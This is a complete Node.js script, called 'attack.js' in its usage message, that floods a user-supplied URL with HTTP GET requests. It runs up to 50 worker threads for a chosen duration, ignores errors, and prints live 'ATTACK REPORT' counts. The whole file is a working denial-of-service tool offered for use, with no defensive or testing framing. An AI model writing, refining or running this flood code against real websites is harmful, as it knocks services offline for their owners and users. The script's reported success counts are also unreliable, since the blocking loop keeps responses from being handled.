const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');

if (isMainThread) {
    const target = process.argv[2];
    const duration = parseInt(process.argv[3], 10); // in seconds
    const threads = parseInt(process.argv[4], 10) || 1;

    if (!target || !duration || threads > 50) {
        console.log('Usage: node attack.js <target> <duration_in_seconds> <threads (max 50)>');
        process.exit(1);
    }

    let totalSent = 0;
    let totalSuccess = 0;

    // Start threads
    for (let i = 0; i < threads; i++) {
        const worker = new Worker(__filename, {
            workerData: { target, duration }
        });

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalSent += msg.sent;
                totalSuccess += msg.success;
            }
        });

        worker.on('exit', () => {
            console.log(`Worker exited`);
        });
    }

    // Show live stats every 1s
    const statsInterval = setInterval(() => {
        console.clear();
        console.log('=== ATTACK REPORT ===');
        console.log('Total sent:', totalSent);
        console.log('Success:', totalSuccess);
    }, 1000);

    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\n=== FINAL REPORT ===');
        console.log('Total sent:', totalSent);
        console.log('Success:', totalSuccess);
        process.exit(0);
    }, duration * 1000);

} else {
    const { target, duration } = workerData;
    const endTime = Date.now() + duration * 1000;
    const parsed = new URL(target);
    const protocol = parsed.protocol === 'https:' ? https : http;

    let sent = 0;
    let success = 0;

    function flood() {
        while (Date.now() < endTime) {
            const req = protocol.request({
                hostname: parsed.hostname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                path: parsed.pathname + parsed.search,
                method: 'GET',
                headers: {
                    Host: parsed.hostname,
                    Connection: 'keep-alive',
                    Accept: '*/*'
                }
            }, res => {
                if (res.statusCode >= 200 && res.statusCode < 400) {
                    success++;
                }
                res.resume(); // Discard body
            });

            req.on('error', () => {}); // Ignore errors
            req.end();
            sent++;

            // Report in batches every 1000 reqs
            if (sent % 1000 === 0) {
                parentPort.postMessage({ type: 'stats', sent: 1000, success });
                success = 0;
            }
        }

        // Final push
        parentPort.postMessage({ type: 'stats', sent: sent % 1000, success });
    }

    flood();
}
